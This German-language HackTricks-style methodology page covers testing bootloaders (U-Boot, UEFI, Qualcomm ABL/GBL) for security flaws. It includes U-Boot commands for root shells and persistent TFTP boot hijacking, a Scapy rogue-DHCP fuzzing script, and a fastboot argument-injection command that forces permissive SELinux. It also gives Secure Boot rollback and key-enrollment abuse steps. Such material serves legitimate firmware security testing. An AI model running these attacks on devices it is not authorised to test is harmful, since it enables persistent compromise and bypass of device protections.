# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden zum Ändern von Gerätestartkonfigurationen und zum Testen von Bootloadern wie U-Boot und UEFI-Klassenloadern empfohlen. Konzentriere dich darauf, frühzeitig Codeausführung zu erreichen, Signatur-/Rollback-Schutzmechanismen zu bewerten und Recovery- oder Network-Boot-Pfade auszunutzen.

Verwandt: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Schnelle Erfolge bei U-Boot und Missbrauch der Umgebung

1. Auf die Interpreter-Shell zugreifen
- Drücke während des Bootens eine bekannte Unterbrechungstaste (häufig eine beliebige Taste, 0, die Leertaste oder eine boardspezifische „magic“-Sequenz), bevor `bootcmd` ausgeführt wird, um zur U-Boot-Eingabeaufforderung zu gelangen.

2. Boot-Zustand und Variablen untersuchen
- Nützliche Befehle:
- `printenv` (Umgebung ausgeben)
- `bdinfo` (Board-Informationen, Speicheradressen)
- `help bootm; help booti; help bootz` (unterstützte Kernel-Boot-Methoden)
- `help ext4load; help fatload; help tftpboot` (verfügbare Loader)

3. Boot-Argumente ändern, um eine Root-Shell zu erhalten
- Hänge `init=/bin/sh` an, damit der Kernel statt der normalen Initialisierung eine Shell startet:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot von deinem TFTP-Server
- Konfiguriere das Netzwerk und rufe ein Kernel-/FIT-Image aus dem LAN ab:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Änderungen über die Umgebung dauerhaft speichern
- Wenn der Env-Speicher nicht schreibgeschützt ist, kannst du die Kontrolle dauerhaft speichern:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Prüfe Variablen wie `bootcount`, `bootlimit`, `altbootcmd` und `boot_targets`, die Fallback-Pfade beeinflussen. Fehlkonfigurierte Werte können wiederholte Unterbrechungen zur Shell ermöglichen.

6. Debug-/unsichere Funktionen prüfen
- Suche nach: `bootdelay` > 0, deaktiviertem `autoboot`, uneingeschränktem `usb start; fatload usb 0:1 ...`, der Möglichkeit, über die serielle Schnittstelle `loady`/`loads` zu verwenden, `env import` von nicht vertrauenswürdigen Medien sowie Kerneln/Ramdisks, die ohne Signaturprüfung geladen werden.

7. U-Boot-Image-/Verifizierungstests
- Wenn die Plattform Secure/Verified Boot mit FIT-Images verspricht, teste sowohl unsignierte als auch manipulierte Images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Das Fehlen von `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder ein Verhalten nach dem Muster `verify=n` ermöglicht häufig das Booten beliebiger Payloads.
- Beschränke dich nicht auf ein einfaches Allow-/Deny-Ergebnis: Aktuelle FIT-Forschung hat gezeigt, dass der Verifizierungspfad selbst eine Pre-Auth-Angriffsfläche sein kann. Führe Negativtests für extern gespeicherte FIT-Daten (`data-offset`, `data-position`, `data-size`), die Auswahl signierter Konfigurationen, `loadables` sowie die Verarbeitung von Overlays/`extra-conf` durch.
- Wenn du über einen passenden Source Tree verfügst, ist `test/vboot/vboot_test.sh` eine schnelle Möglichkeit, das FIT-Verifizierungsverhalten in der U-Boot-Sandbox zu reproduzieren, bevor echte Hardware verwendet wird.

8. Standard Boot (`bootstd`), `extlinux` und script bootflows
- Bei modernen U-Boot-Builds ist `bootcmd` häufig nur ein Wrapper um Standard Boot. Dadurch können beschreibbare Medien, PXE oder SPI-Flash die tatsächliche Trust Boundary bilden, selbst wenn die sichtbare Umgebung harmlos aussieht.
- Die `extlinux`-Bootmeth sucht unter `/` und `/boot` nach `extlinux/extlinux.conf`; die script bootmeth sucht zuerst nach `boot.scr.uimg` und anschließend nach `boot.scr`. Beim Network Boot kann der Script-Dateiname aus `boot_script_dhcp` stammen.
- Nützliche Triage-Befehle:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Zu testende Missbrauchsfälle: vom Angreifer kontrollierte USB-/SD-Medien an einer früheren Position in `boot_targets`, eine beschreibbare `/boot/extlinux/extlinux.conf`, ein manipuliertes TFTP, das `boot.scr` bereitstellt, oder SPI-gestützte Script-Ausführung über `script_offset_f`.
- Wenn die Plattform auf FIT-Verifizierung setzt, stelle sicher, dass Konfigurationen auf Konfigurationsebene signiert werden und nicht nur einzelne Images; `required-mode=all` ist stärker als die Akzeptanz eines einzelnen erforderlichen Schlüssels.

## Network-Boot-Angriffsfläche (DHCP/PXE) und Rogue-Server

9. Fuzzing von PXE-/DHCP-Parametern
- Die Verarbeitung von BOOTP/DHCP durch U-Boot hatte bereits Memory-Safety-Probleme. CVE‑2024‑42040 beschreibt beispielsweise eine Offenlegung von Speicherinhalten durch manipulierte DHCP-Antworten, die Bytes aus dem U-Boot-Speicher über das Netzwerk leaken können. Teste die DHCP-/PXE-Codepfade mit überlangen Grenzwerten und ungewöhnlichen Werten (Option-67-`bootfile-name`, Vendor-Optionen, `file`-/`servername`-Felder) und beobachte Hänger/Leaks.
- Minimales Scapy-Snippet zum Belastungstest von Boot-Parametern während des Netboots:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Prüfe außerdem, ob PXE-Dateinamenfelder bei der Verkettung mit OS-seitigen Provisioning-Scripts ohne Bereinigung an Shell-/Loader-Logik übergeben werden.

10. Tests auf Command Injection über einen Rogue-DHCP-Server
- Richte einen Rogue-DHCP-/PXE-Service ein und versuche, Zeichen in Datei- oder Optionsfeldern zu injizieren, um in späteren Phasen der Boot-Kette Command Interpreter zu erreichen. Metasploits DHCP-Auxiliary, `dnsmasq` oder eigene Scapy-Scripts eignen sich gut dafür. Isoliere zuerst das Labornetzwerk.

## SoC-ROM-Recovery-Modi, die den normalen Boot-Vorgang überschreiben

Viele SoCs stellen einen BootROM-„Loader“-Modus bereit, der Code über USB/UART akzeptiert, selbst wenn Flash-Images ungültig sind. Wenn Secure-Boot-Fuses nicht gebrannt sind, kann dies sehr früh in der Kette beliebige Codeausführung ermöglichen.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) oder `imx-usb-loader`.
- Beispiel: `imx-usb-loader u-boot.imx`, um einen eigenen U-Boot aus dem RAM zu laden und auszuführen.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Beispiel: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` oder `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Beispiel: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`, um einen Loader bereitzustellen und einen eigenen U-Boot hochzuladen.

Bewerte, ob das Gerät über gebrannte Secure-Boot-eFuses/OTP verfügt. Falls nicht, umgehen BootROM-Download-Modi häufig jegliche übergeordnete Verifizierung (U-Boot, Kernel, Rootfs), indem sie deine First-Stage-Payload direkt aus SRAM/DRAM ausführen.

## UEFI-/PC-Klassen-Bootloader: schnelle Prüfungen

11. ESP-Manipulation, Rollback- und Key-Enrollment-Tests
- Hänge die EFI System Partition (ESP) ein und prüfe auf Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` sowie Pfade zu Herstellerlogos.
- Gib den Secure-Boot-Status und die Schlüssel-Datenbanken möglichst aus dem OS aus:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Wenn sich die Plattform im Setup Mode befindet, nicht authentifiziertes Key Enrollment akzeptiert oder mit einem Test-/Standard-Platform Key (PKfail-Klasse) ausgeliefert wird, kann ein lokaler Administrator oder Angreifer mit physischem Zugriff einen eigenen KEK/db registrieren und Secure Boot scheinbar „aktiviert“ lassen, während beliebige EFI-Binaries gebootet werden.
- Versuche, mit herabgestuften oder bekannten verwundbaren signierten Boot-Komponenten zu booten, wenn die Secure-Boot-Widerrufe (`dbx`) nicht aktuell sind. Wenn die Plattform alte Shims/Bootmanager weiterhin vertraut, kannst du häufig deinen eigenen Kernel oder deine eigene `grub.cfg` von der ESP laden, um Persistenz zu erhalten.

12. Tests auf veraltete Shim-/SBAT-/dbx-Widerrufe
- Alte von Microsoft signierte Shims und Hersteller-Forks können weiterhin als BYOVD-artiger Bootkit-Pfad dienen, wenn Widerrufe veraltet sind. Platziere in einem isolierten Lab einen historisch verwundbaren Shim auf der ESP und versuche, dein eigenes `grubx64.efi` oder deinen eigenen Kernel per Chainload zu laden.
- Schnelle Triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Wenn der Shim weiterhin ausgeführt wird, obwohl er auf der Widerrufsliste steht, verfügt die Firmware/das OS über veraltete `dbx`-Updates oder vertraut einem geforkten Loader, der die Upstream-SBAT-Schutzmechanismen nie übernommen hat.

13. Fehler beim Parsen von Boot-Logos (LogoFAIL-Klasse)
- Mehrere OEM-/IBV-Firmwares waren anfällig für Image-Parsing-Fehler in DXE, die Boot-Logos verarbeiten. Wenn ein Angreifer ein manipuliertes Image unter einem herstellerspezifischen Pfad auf der ESP platzieren kann (z. B. `\EFI\<vendor>\logo\*.bmp`) und das Gerät neu startet, kann trotz aktiviertem Secure Boot Codeausführung während des frühen Bootens möglich sein. Teste, ob die Plattform vom Benutzer bereitgestellte Logos akzeptiert und ob diese Pfade aus dem OS beschreibbar sind.


## Android/Qualcomm ABL + GBL (Android 16) Trust Gaps

Auf Android-16-Geräten, die Qualcomms ABL zum Laden der **Generic Bootloader Library (GBL)** verwenden, muss geprüft werden, ob ABL die aus der `efisp`-Partition geladene UEFI-App **authentifiziert**. Wenn ABL lediglich die **Existenz** einer UEFI-App prüft und keine Signaturen verifiziert, wird ein Schreibprimitiv auf `efisp` zu **Pre-OS-Unsigned-Code-Execution** beim Booten.

Praktische Prüfungen und Missbrauchspfade:

- **efisp-Schreibprimitiv**: Du benötigst eine Möglichkeit, eine eigene UEFI-App in `efisp` zu schreiben (Root/privilegierter Service, Fehler in einer OEM-App, Recovery-/Fastboot-Pfad). Ohne diese Möglichkeit ist die GBL-Lücke nicht direkt erreichbar.
- **fastboot-OEM-Argument-Injection** (ABL-Bug): Einige Builds akzeptieren zusätzliche Tokens in `fastboot oem set-gpu-preemption` und hängen sie an die Kernel-Commandline an. Dies kann verwendet werden, um permissives SELinux zu erzwingen und dadurch Schreibzugriffe auf geschützte Partitionen zu ermöglichen:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Wenn das Gerät gepatcht ist, sollte der Befehl zusätzliche Argumente ablehnen.
- **Bootloader-Unlock über persistente Flags**: Eine Payload in der Boot-Phase kann persistente Unlock-Flags (z. B. `is_unlocked=1`, `is_unlocked_critical=1`) ändern, um `fastboot oem unlock` ohne OEM-Server-/Freigabekontrollen zu simulieren. Dies ist nach dem nächsten Neustart eine dauerhafte Änderung der Sicherheitslage.

Hinweise zu Schutzmaßnahmen/Triage:

- Bestätige, ob ABL eine Signaturprüfung der GBL-/UEFI-Payload aus `efisp` durchführt. Falls nicht, behandle `efisp` als Persistence-Fläche mit hohem Risiko.
- Verfolge, ob die Fastboot-OEM-Handler von ABL gepatcht wurden, um **Argumentanzahlen zu validieren** und zusätzliche Tokens abzulehnen.

## Hardware-Hinweis

Sei vorsichtig beim Umgang mit SPI-/NAND-Flash während des frühen Bootens (z. B. beim Erden von Pins zur Umgehung von Lesevorgängen) und konsultiere immer das Datenblatt des Flash-Speichers. Falsch getimte Kurzschlüsse können das Gerät oder den Programmer beschädigen.

## Hinweise und zusätzliche Tipps

- Versuche `env export -t ${loadaddr}` und `env import -t ${loadaddr}`, um Umgebungs-Blobs zwischen RAM und Speicher zu verschieben; einige Plattformen erlauben den Import von Env aus Wechselmedien ohne Authentifizierung.
- Für Persistenz auf Linux-basierten Systemen, die über `extlinux.conf` booten, reicht das Ändern der `APPEND`-Zeile (zum Injizieren von `init=/bin/sh` oder `rd.break`) auf der Boot-Partition häufig aus, wenn keine Signaturprüfungen erzwungen werden.
- Wenn das Ziel Dual-Slot-/A/B-Updates verwendet, prüfe die Anti-Rollback- und Slot-Desync-Techniken in der [firmware analysis overview](README.md), damit du keine Updater-spezifischen Trust Gaps außerhalb des Bootloaders selbst übersiehst.
- Wenn das Userland `fw_printenv/fw_setenv` bereitstellt, überprüfe, ob `/etc/fw_env.config` dem tatsächlichen Env-Speicher entspricht. Falsch konfigurierte Offsets ermöglichen das Lesen/Schreiben der falschen MTD-Region.

## Referenzen

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
